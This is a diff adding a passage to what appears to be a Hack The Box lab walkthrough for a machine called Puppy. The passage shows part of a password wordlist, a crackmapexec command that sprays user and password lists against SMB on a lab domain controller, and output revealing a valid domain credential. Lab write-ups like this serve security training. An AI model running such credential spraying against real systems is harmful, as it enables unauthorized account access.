@@ -273,3 +273,20 @@ JamieLove2025!
 ILY2025!
 Steve2025!
 ```
+
+Now, we can check for successful userpass combinations using crackmapexec:
+
+#### Running crackmapexec:
+
+```
+crackmapexec smb 10.129.232.75 -u users.txt -p passwords.txt --continue-on-success | grep + 
+```
+
+#### Output:
+
+```
+SMB                      10.129.232.75   445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
+```
+
+## ant.edwards -> adam.silver
+
